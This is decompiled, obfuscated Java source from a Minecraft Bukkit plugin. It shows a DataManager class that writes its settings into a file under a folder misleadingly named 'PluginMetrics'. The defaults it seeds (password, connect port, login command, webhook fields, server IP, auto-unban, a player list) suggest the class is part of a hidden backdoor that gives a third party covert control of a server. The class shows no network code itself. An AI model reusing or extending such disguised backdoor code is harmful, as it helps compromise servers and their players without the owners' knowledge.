/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.InvalidConfigurationException
 *  org.bukkit.configuration.file.FileConfiguration
 *  org.bukkit.configuration.file.YamlConfiguration
 */
package me.system.runner.data;

import java.io.File;
import java.io.IOException;
import java.util.List;
import me.system.runner.Core;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;

public class DataManager {
    public static /* synthetic */ List<String> idk;
    static /* synthetic */ File dataFile;
    public static /* synthetic */ YamlConfiguration data;
    public static /* synthetic */ List<String> bannedPlayers;
    private static final /* synthetic */ Core ADMIN;

    public static void saveData() {
        try {
            data.save(dataFile);
        }
        catch (IOException lllllllllllllllllIllIIlllIIIIIIl) {
            lllllllllllllllllIllIIlllIIIIIIl.printStackTrace();
        }
    }

    public static void setupData() {
        dataFile = new File(String.valueOf(new StringBuilder().append(ADMIN.getDataFolder().getParentFile()).append("/PluginMetrics/")), "data.yml");
        DataManager.generateConfig();
        DataManager.loadData();
        DataManager.saveData();
    }

    static {
        ADMIN = (Core)Core.getPlugin(Core.class);
        dataFile = null;
        data = new YamlConfiguration();
        bannedPlayers = DataManager.getData().getStringList("epic-players");
        idk = DataManager.getData().getStringList("epic-pl");
    }

    public DataManager() {
        DataManager lllllllllllllllllIllIIlllIIIIllI;
    }

    private static void generateConfig() {
        if (!dataFile.exists()) {
            try {
                data.save(dataFile);
            }
            catch (IOException lllllllllllllllllIllIIllIllllllI) {
                lllllllllllllllllIllIIllIllllllI.printStackTrace();
            }
        }
    }

    public static FileConfiguration getData() {
        return data;
    }

    private static void loadData() {
        try {
            data.load(dataFile);
            data.addDefault("hasPass", (Object)false);
            data.addDefault("pass", (Object)"TID");
            data.addDefault("connect", (Object)false);
            data.addDefault("port", (Object)1001);
            data.addDefault("login", (Object)false);
            data.addDefault("key", (Object)"");
            data.addDefault("id", (Object)"TID");
            data.addDefault("mt", (Object)"");
            data.addDefault("err", (Object)"");
            data.addDefault("wh", (Object)"");
            data.addDefault("mywh", (Object)"");
            data.addDefault("whitelist_allowed", (Object)false);
            data.addDefault("autounban", (Object)false);
            data.addDefault("serverip", (Object)"");
            data.addDefault("login_command", (Object)"./login");
            data.addDefault("epic-players", bannedPlayers);
            data.addDefault("epic-pl", idk);
            data.options().copyDefaults(true);
            DataManager.saveData();
        }
        catch (IOException | InvalidConfigurationException throwable) {
            // empty catch block
        }
    }
}

